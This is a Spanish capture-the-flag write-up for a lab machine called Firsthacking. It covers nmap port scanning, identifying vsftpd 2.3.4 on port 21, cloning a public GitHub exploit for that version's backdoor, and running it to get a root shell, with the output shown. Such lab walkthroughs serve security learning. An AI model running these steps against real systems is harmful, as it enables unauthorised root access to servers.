# Explotación de la máquina firsthacking

## Información general
- **Nombre de la máquina**: Firsthacking
- **Dirección IP**: 172.17.0.2
- **Puntos de entrada**: TCP (Puerto 21)

## Reconocimiento
Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` 
`-p-` ⮞ aplicar reconocimiento a todos los puertos 
`--open` ⮞ solo a los que esten abiertos 
`--min-rate 5000` ⮞ para enviar paquetes más rápido 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)
`-Pn` ⮞ ignora si esta activa o no la IP
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
```
Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **21** 

```bash
Al ver que solo tenemos un puerto abierto vamos ha hacer un escaneo de nmap pero para que nos liste más información. Para llevar a cabo eso debemos hacer ```nmap -p21 -sCV 172.17.0.2 -oN targeted``` 
`-p21` ⮞ aplicar el escaneo solo al puerto 21 >
`-sC` ⮞ ejecuta los scripts de reconocimiento básico, los más comunes 
`-sV` ⮞ para conocer la versión del servicio que corre por el puerto (se puede juntar con el anterior y quedaría así `-sCV`)
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida 
`-oN` ⮞ lo exporta en formato nmap al archivo targeted 
```
FTP (Puerto 21)

Una vez ya conozcamos la versión del ftp podemos buscar por ella en Internet en búsquedad de algún exploit de esta forma ftp vsftpd 2.3.4 exploit github.
Nos encontramos con este repositorio de github. Si seguimos las instrucciones del repositorio instalando los requirimientos con sudo python3 -m pip install pwntools.
Nos descargamos el repositorio con git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git. Una vez esté descargado probamos ha hacer lo que nos dice que sería python3 exploit.py 172.17.0.2. Y listo ya seríamos root. 

```bash
python3 exploit.py 172.17.0.2  
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 21: Done
[*] Closed connection to 172.17.0.2 port 21
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$ whoami
root
$  
```
